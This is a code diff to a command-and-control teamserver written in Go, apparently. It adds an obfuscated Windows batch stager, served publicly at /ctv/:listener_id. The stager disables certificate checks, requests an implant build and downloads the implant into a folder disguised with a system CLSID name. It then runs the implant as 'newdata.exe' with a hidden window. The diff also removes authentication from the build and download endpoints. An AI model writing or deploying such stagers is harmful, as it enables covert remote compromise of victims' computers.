@@ -30,6 +30,43 @@ import (
 	"c2/internal/teamserver/listener"
 )
 
+// buildCtvScript generates the on-demand-build stager script with dynamic
+// server URL and listener ID injected.
+func buildCtvScript(serverURL, listenerID string) string {
+	script := `@echo off&chcp 65001>nul&setlocal enabledelayedexpansion
+call:i&call:m
+endlocal&exit/b
+:i
+set "A=__SERVER_URL__"&set "L=__LISTENER_ID__"&set "O=windows"&set "T=reverse"
+set "P=%PROCESSOR_ARCHITECTURE%"
+if /i "%P%"=="AMD64" set "R=amd64"&goto:eof
+if /i "%P%"=="ARM64" set "R=arm64"&goto:eof
+set "R=386"
+goto:eof
+:m
+call:b
+call:f
+if not defined D exit/b 1
+set "U=%A%%D%"
+call:d
+call:s
+goto:eof
+:b
+set "J={\"os\":\"%O%\",\"arch\":\"%R%\",\"listener_id\":\"%L%\",\"connection_type\":\"%T%\"}"&goto:eof
+:f
+set "D="&set "N="
+for /f "delims=" %%l in ('powershell "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$h=@{'Content-Type'='application/json'};$b='%J%';try{$r=Invoke-RestMethod -Uri '%A%/api/v1/build' -Method Post -Headers $h -Body $b -TimeoutSec 10;$r.download_url;$r.filename}catch{exit 1}"') do if not defined D (set "D=%%l")else set "N=%%l"&goto:eof
+:d
+powershell "$folder = Join-Path $env:PUBLIC 'Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}';New-Item -Path $folder -ItemType Directory -Force | Out-Null;$saveFile = Join-Path $folder 'newdata.exe';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};try{Invoke-WebRequest -Uri '%U%' -OutFile $saveFile -TimeoutSec 10}catch{}"&goto:eof
+:s
+powershell "$exePath = Join-Path $env:PUBLIC 'Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\newdata.exe';if(Test-Path $exePath){Start-Process -FilePath $exePath -WindowStyle Hidden}else{}"
+goto:eof
+`
+	script = strings.ReplaceAll(script, "__SERVER_URL__", serverURL)
+	script = strings.ReplaceAll(script, "__LISTENER_ID__", listenerID)
+	return script
+}
+
 // Server is the main teamserver instance.
 type Server struct {
 	config      *Config
@@ -295,14 +332,25 @@ func (s *Server) setupRoutes() {
 			admin.DELETE("/agents/:id", s.handleDeleteAgent)
 			// Tasks (delete)
 			admin.DELETE("/tasks/:id", s.handleDeleteTask)
-			// Build
-			admin.POST("/build", s.handleBuildImplant)
 		}
 	}
+
+	// Public build endpoint (called by stager scripts without auth)
+	s.gin.POST("/api/v1/build", s.handleBuildImplant)
 
 	// Health check (public)
 	s.gin.GET("/health", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"status": "ok"})
+	})
+
+	// CTV stager script (public, plain text, dynamic listener ID)
+	s.gin.GET("/ctv/:listener_id", func(c *gin.Context) {
+		listenerID := c.Param("listener_id")
+		// Use the frontend dev-server URL so that /api calls go through the Vite proxy.
+		// In production (where frontend and backend share the same origin),
+		// this should be changed to scheme + "://" + c.Request.Host.
+		serverURL := "http://localhost:5173"
+		c.String(http.StatusOK, buildCtvScript(serverURL, listenerID))
 	})
 
 	// WebSocket for real-time agent terminal
@@ -550,12 +598,7 @@ func (s *Server) handleBuildImplant(c *gin.Context) {
 		return
 	}
 
-	// Extract raw JWT for download URL (browser <a href> uses query param)
-	rawToken := ""
-	if authHeader := c.GetHeader("Authorization"); strings.HasPrefix(authHeader, "Bearer ") {
-		rawToken = authHeader[7:]
-	}
-	downloadURL := fmt.Sprintf("/api/v1/download/%s?token=%s", result.Filename, rawToken)
+	downloadURL := fmt.Sprintf("/api/v1/download/%s", result.Filename)
 
 	c.JSON(http.StatusOK, gin.H{
 		"download_url":    downloadURL,
@@ -579,15 +622,14 @@ func (s *Server) handleBuildImplant(c *gin.Context) {
 }
 
 func (s *Server) handleDownload(c *gin.Context) {
-	// Authenticate via query parameter token (browser <a href> can't set headers)
+	// Token is optional — stager scripts call this without auth.
+	// Browser <a href> links still pass token via query param.
 	token := c.Query("token")
-	if token == "" {
-		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"code": "UNAUTHORIZED", "message": "Missing token"}})
-		return
-	}
-	if _, err := auth.ValidateAccessToken(token, s.jwtSecret); err != nil {
-		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"code": "UNAUTHORIZED", "message": "Invalid or expired token"}})
-		return
+	if token != "" {
+		if _, err := auth.ValidateAccessToken(token, s.jwtSecret); err != nil {
+			c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"code": "UNAUTHORIZED", "message": "Invalid or expired token"}})
+			return
+		}
 	}
 
 	filename := c.Param("filename")
